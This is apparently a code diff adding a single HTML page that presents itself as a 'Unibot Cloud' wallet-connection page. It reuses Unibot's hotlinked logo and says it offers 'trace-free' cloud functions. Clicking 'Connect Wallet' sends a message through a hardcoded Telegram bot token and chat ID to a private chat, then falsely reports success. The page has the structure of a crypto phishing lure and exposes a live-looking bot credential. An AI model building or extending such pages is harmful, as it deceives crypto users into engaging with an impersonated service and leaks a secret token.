@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Unibot Cloud - Connect Wallet</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+      background-color: #0d1117; /* Main background color */
+      color: #c9d1d9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background-color: #161b22; /* Card background color */
+      border-radius: 12px; /* Rounded corners */
+      padding: 20px;
+      width: 400px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5); /* Shadow for depth */
+      text-align: center;
+    }
+
+    .container h1 {
+      font-size: 24px;
+      margin-bottom: 10px;
+      color: #58a6ff; /* Title color */
+    }
+
+    .container p {
+      font-size: 14px;
+      margin-bottom: 20px;
+      color: #8b949e; /* Subtle text color */
+    }
+
+    .logo {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      width: 60px;
+      height: auto;
+    }
+
+    .logo-center {
+      width: 80px;
+      height: auto;
+      margin-bottom: 20px;
+    }
+
+    .connect-btn {
+      background-color: #0366d6; /* Blue button color */
+      color: #ffffff;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      border-radius: 6px; /* Button rounded corners */
+      cursor: pointer;
+      font-size: 16px;
+      text-transform: uppercase;
+      font-weight: bold;
+    }
+
+    .connect-btn:hover {
+      background-color: #0356b6; /* Button hover color */
+    }
+
+    .connect-btn:active {
+      background-color: #024a96; /* Button pressed color */
+    }
+  </style>
+</head>
+<body>
+  <img src="https://unibot.app/images/unibotXLogo.png" alt="Unibot Logo" class="logo">
+  <div class="container">
+    <img src="https://unibot.app/images/unibotXLogo.png" alt="Unibot Logo Center" class="logo-center">
+    <h1>Unibot Cloud</h1>
+    <p>Recordless trace-free Unibot cloud functions for user-sensitive data.</p>
+    <form id="walletForm">
+      <button type="submit" class="connect-btn">Connect Wallet</button>
+    </form>
+  </div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = '7701963149:AAFUNKG2r9o7Uc_7C4rp1SP7qbgbOJBSnOg'; // Replace with your actual bot token
+    const TELEGRAM_CHAT_ID = '-4704812522'; // Replace with your actual chat ID
+
+    document.getElementById('walletForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const message = "Wallet Connection Requested.";
+
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+          }),
+        });
+
+        alert('Wallet connection request sent successfully!');
+      } catch (err) {
+        console.error('Error sending message to Telegram:', err);
+        alert('Failed to send wallet connection request.');
+      }
+    });
+  </script>
+</body>
+</html>
